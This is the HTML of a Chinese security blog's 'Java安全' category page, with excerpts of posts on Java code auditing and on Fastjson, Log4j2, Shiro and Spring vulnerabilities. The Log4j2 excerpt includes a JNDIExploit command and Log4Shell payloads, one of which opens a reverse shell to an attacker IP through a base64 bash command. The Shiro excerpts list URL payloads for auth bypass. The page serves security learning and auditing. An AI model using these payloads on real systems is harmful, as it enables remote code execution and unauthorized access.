<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Java安全 | 养猪日记</title>
<meta name=keywords content><meta name=description content="养猪日记"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/index.xml><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Java安全"><meta property="og:description" content="养猪日记"><meta property="og:type" content="website"><meta property="og:url" content="https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Java安全"><meta name=twitter:description content="养猪日记"></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/categories/>Categories</a></div><h1>Java安全</h1></header><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>代码审计总结</h2></header><div class=entry-content><p>前言 Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。
常见组件漏洞 1、Shiro shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：
硬编码： 硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：
securityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager() 关键词：setRememberMeManager 具体实现： public CookieRememberMeManager rememberMeManager() { CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCookie(rememberMeCookie()); cookieRememberMeManager.setCipherKey(Base64.decode("fCq+/xW488hMTCD+cmJ3aQ==")); return cookieRememberMeManager; } 搜索密钥关键词：setCipherKey shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词： org.apache.shiro.web.mgt.DefaultWebSecurityManager org.apache.shiro.web.mgt.CookieRememberMeManager 案例：
权限绕过： CVE 描述 影响范围 payload CVE-2020-1957 权限绕过 Shiro &lt; 1.5.2 /xxx/..;/admin/ CVE-2020-11989 CVE-2020-1957补丁绕过 Shiro &lt; 1.5.3 /;/admin/page CVE-2020-13933 CVE-2020-11989补丁绕过 Shiro &lt; 1.6.0 /admin/%3bpage CVE-2020-17523 权限绕过 Shiro &lt; 1.7.1 /admin/%20 /admin/%2e shiro配置路径匿名访问的方法大概如下：
...</p></div><footer class=entry-footer><span title='2024-12-19 14:25:59 +0800 CST'>December 19, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;837 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 代码审计总结" href=https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Fastjson</h2></header><div class=entry-content><p>一、FastJson介绍 Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。
二、漏洞原理 fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；
2.1 JNDI注入的前置知识 2.1.1 Java Bean 一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。
1、成员变量均使用private关键字进行修饰
2、提供构造方法(有参/无参)
3、为每个成员变量提供set/get方法
2.1.2 反射 一种可以调用任意类任意方法的类；
2.1.3 序列化和反序列化 远程数据传输，不安全的反序列化可以造成RCE；
2.1.4 JNDI Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源
在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入
InitialContext context = new InitialContext();
context.lookup("rmi://localhost:1099/HelloService"); 具体流程如下：
1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； 2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； 3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； 4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 5、攻击者可以在Factory类文件的
另外一种解释：
JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。
一些版本注入的问题：
RMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。
使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）
从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的
payload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）
从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击
方式开始失效。（直接不信任rmi）
从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻
击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））
RMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。
RMI客户端使用lookup方法理论上可以主动攻击RMI Registry
RMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端
来看一下这个路程
（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化
（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用
jrmp的payload（其实就是绕过了黑名单能发送数据的类）
（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了
舞台
（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本
地存在的链子命令执行，不需要像外部做加载。 高版本注入的解决办法：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;814 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to Fastjson" href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Log4j2</h2></header><div class=entry-content><p>一、Log4j2 Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。
​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。
二、漏洞原理 由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施 导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。
来看一下正常使用的代码：
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Log4j2Test {
private static final Logger logger = LogManager.getLogger();
public static void main(String[] args) {
String username = "world";
logger.error("hello {}",username);
} 正常这里会传入log4j2，hello word，如果我们传入${java:version}则会记录java版本， 大致的调用链如下：
MessagePatternConverter.format()会对${进行检测识别，并调用StrSubstitutor.replace()对传入的值进行处理StrSubstitutor类中多个方法处理到StrSubstitutor.substitute()将${jndi:rmi://192.168.198.134:9999/exp}处理解析为jndi:rmi://192.168.198.134:9999/exp后并调用resolveVariable() StrSubstitutor.resolveVariable()调用lookup方法 判断识别jndi的处理类JndiLookup JndiLookup.lookup()调用JndiManager.getDefaultManager()获得context 并通过JndiManager.lookup()调用java自身的InitialContext.lookup()，InitialContext类是执行命名操作的初始上下文，所有命名操作都相对于某一上下文，该初始上下文实现 Context 接口并提供解析名称的起始点，通过lookup()检索
到最后一步，如果看不明白可以详细查看JNDI注入的相关内容。
三、漏洞发现 由于日志框架，只能哪里有空哪里插，目前依赖于插件以及xray等工具进行检测
影响范围：Apache Log4j 2.x&lt;=2.14.1
四、漏洞利用 开启log4j2的JNDI注入工具：
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40 值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址
发送恶意payload:
基础payload:
${jndi:ldap://dadad.ceye.io} 反弹shell：
${jndi:ldap://10.10.14.147:1389/Basic/ReverseShell/10.10.14.147/8888} 实战中有失败案例
${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvODg4OCAwPiYx} 使用较多 另外一个工具的使用方式：
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;200 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to Log4j2" href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>shiro</h2></header><div class=entry-content><p>一、shiro Apache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。
Shiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；
二、漏洞原理 CVE-2016-4437/Shiro-550 Shiro &lt; 1.2.5
第1个注意的事项：要在response中返回含有remenberMe的字段对应的请求中去构造poc
第2个注意的事项 ：获取cookies的请求包resquest的必须是登录提交的http请求
（1）shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro会对用户传入的cookie进行解密并进行反序列化，服务端接收rememberMe的cookie值后的操作是：
Cookie中rememberMe字段内容
---> Base64解码 ---> 使用密钥进行AES-CBC解密 ---> 反序列化
（2）由于该版本AES加密的密钥Key被硬编码在代码里（漏洞能够被利用的本质），且大部分项目未修改默认AES密钥，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段值发送，Shiro将数据进行解密并且反序列化，最终触发反序列化漏洞。
官方针对这个漏洞的修复方式将使用默认硬编码的Key改为生成随机的Key加密。
密钥保存位置：
最后的触发位置是标准的readobject()，所以利用链基本上就是CC链或者其他依赖链了。
CVE-2019-12422/Shiro-721 Shiro &lt; 1.4.2
在Apache Shiro 中用户进行登录的时候, 提供RemenberMe功能处理cookie，使用的是AES-128-CBC加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，可进行反序列化攻击。
跟Shiro无关，而是对Shiro采用的加密方式进行的攻击，所以略过，只要了解了Padding Oracle Attack 原理就能理解这个攻击的原理，这里推荐Padding Oracle Attack(填充提示攻击)详解及验证。
简单来说，Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击。解密出的明文填充的正确与否可通过服务端的响应进行区分。通过不断调整发送的密文分组，然后根据服务端的结果进行爆破测试，可推测出确定的解密值。当应用程序接受到加密后的值以后，可能有以下三种返回：
1、接受到正确的密文之后（填充正确且包含正确的值），应用程序正常返回：200 OK。
2、接受到合法的密文（填充正确，但解密后得到一个不正确的值），应用程序显示自定义错误消息：200 OK。
3、接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常：500 Internal Server Error。
我们不需要要求解密后必须是正确的值，只要返回200 ok即可。
aes gcm加密方式不一样的
CVE-2020-1957/认证绕过漏洞 Shiro &lt; 1.5.2
spring Boot中使用Apache Shiro进行身份验证、权限控制时，可以精心构造恶意的URL，利用Apache Shiro和Spring Boot对URL的处理的差异化，可以绕过Apache Shiro对Spring Boot中的Servlet的权限控制，越权并实现未授权访问。
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;97 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to shiro" href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Spring</h2></header><div class=entry-content><p>一、Spring生态 Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。
Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。
Spring Framework Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。
Spring Boot Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。
Spring Cloud Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。
Spring Security Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。
二、漏洞原理 Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。
...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;570 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to Spring" href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/></a></article><footer class=page-footer><nav class=pagination><a class=next href=https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/page/2/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>